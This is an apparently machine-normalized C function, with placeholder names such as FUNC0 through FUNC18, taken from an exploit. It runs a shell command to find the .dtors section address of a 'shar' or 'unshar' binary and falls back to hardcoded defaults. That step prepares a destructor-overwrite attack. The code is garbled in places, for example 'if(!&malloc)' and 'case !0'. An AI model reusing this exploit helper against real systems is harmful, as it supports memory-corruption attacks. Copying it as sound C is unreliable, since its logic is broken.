#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int u_int32_t ;
typedef  int /*<<< orphan*/  tmpfull ;
typedef  int /*<<< orphan*/  ssize_t ;
typedef  char int8_t ;
typedef  int int16_t ;
typedef  int /*<<< orphan*/  buffer ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int DEFAULT_DTORS_SHAR ; 
 int DEFAULT_DTORS_UNSHAR ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 char* GET_DTORS_CMD ; 
 char* SHAR_PATH ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (int,char*) ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char**,int*,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC9 (int) ; 
 scalar_t__ FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,int,char*,char*,char*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ) ; 
 int FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int FUNC15 (char*,char**,int) ; 
 int FUNC16 (char*) ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 

u_int32_t FUNC18(int8_t* path) {
 
 FILE *readit;
 int *tmpfile;
 int8_t tmpfull[32];
 char *store_dtors;
 
 int16_t status;
 int16_t length;
 
 ssize_t read;
 u_int32_t findme;
 int8_t *dtorsbuf = NULL;
 FUNC0((int8_t *)tmpfull,sizeof(tmpfull));
 
 FUNC14(tmpfull,"/tmp/candyXXXXXX",FUNC13("/tmp/candyXXXXXX"));
 tmpfile = (int *)FUNC10((int8_t *)tmpfull);
 int8_t *buffer = (int8_t *) FUNC9(100 * sizeof(int8_t *));
 if(!&malloc) { FUNC1(1,"malloc"); FUNC2(EXIT_FAILURE); }
 
 FUNC0(buffer,sizeof(buffer));
 FUNC11(buffer,100,GET_DTORS_CMD,path,tmpfull);
 buffer[FUNC13(buffer)] = '\0';
 
 int8_t *shar_path = SHAR_PATH;
 status = FUNC16(buffer);
 

 switch((status >> 8 ) & 0xff) {
          
          case 0:
          FUNC6(stdout,"[+]Utilities check successful, no Need Defaults\n");
          break;
          
          case !0:
          FUNC6(stdout,"[+]Using default .Dtors address\n");
          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
          goto GO_ON;
          
          default:
          FUNC6(stdout,"[+]Using default .Dtors address\n");
          FUNC6(stdout,"[+]Dtors address => 0x%x\n",DEFAULT_DTORS_SHAR );
          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
          goto GO_ON;
   }
    
 
       
       if ( (readit = FUNC5(tmpfull,"rb")) == NULL ) {
          FUNC12(errno);
          FUNC6(stdout,"[+]Using default .Dtors address\n");
          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
          goto GO_ON;
          }
          read = FUNC8(&dtorsbuf,&length,readit);
       
     FUNC4(readit);
     dtorsbuf[FUNC13(dtorsbuf) -1 ] = '\0';
     findme = FUNC15(dtorsbuf,&store_dtors,16);
     
     FUNC3(readit);
     FUNC7(dtorsbuf);
     FUNC17(tmpfull);
     FUNC6(stdout,"[+]Dtors address found => 0x%x\n",findme + 0x4);
GO_ON:
     FUNC17(tmpfull); /* For System Crashes */
     return(findme + 4);
}